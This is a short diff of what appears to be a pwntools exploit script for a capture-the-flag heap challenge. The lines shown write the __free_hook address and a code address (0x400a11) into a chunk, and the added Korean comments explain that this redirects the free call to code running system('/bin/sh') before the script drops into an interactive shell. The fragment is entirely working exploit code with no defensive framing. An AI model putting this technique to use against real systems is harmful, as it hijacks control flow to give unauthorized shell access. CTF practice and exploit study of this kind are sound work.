@@ -29,5 +29,8 @@ p.recvuntil("Size: ")
 p.sendline("400")
 p.recvuntil("Data: ")
 p.sendline(p64(free_hook) + p64(0x400a11))
+# 문제를 일으키는 free 부분을 다른 부분으로 넘겨버림
+# ptr[1]의 주소에 system("/bin/sh")를 가리키는 코드 주소를 넣어
+# 바로 코드 상의 system("/bin/sh")로 이어지게 만든다
 
 p.interactive()
